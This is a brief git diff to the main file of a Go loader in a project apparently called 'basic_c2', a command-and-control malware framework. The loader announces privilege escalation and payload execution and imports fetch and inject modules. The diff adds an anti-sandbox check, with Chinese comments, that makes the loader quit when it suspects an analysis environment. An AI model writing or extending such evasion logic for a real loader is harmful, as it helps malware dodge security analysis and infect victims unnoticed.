@@ -1,6 +1,7 @@
 package main
 
 import (
+	"basic_c2/agent/evasion"
 	"basic_c2/internal/config"
 	"basic_c2/loader/fetch"
 	"basic_c2/loader/inject"
@@ -13,6 +14,12 @@ import (
 
 func main() {
 	fmt.Println("======== [Loader: Privilege Escalation & Payload Execution] ========")
+
+	// 1. 反沙箱检测
+	if evasion.CheckSandbox() {
+		// 环境可疑，直接退出
+		return
+	}
 
 	// 1. 检查是否首次运行
 	firstRun := !isInstalled()
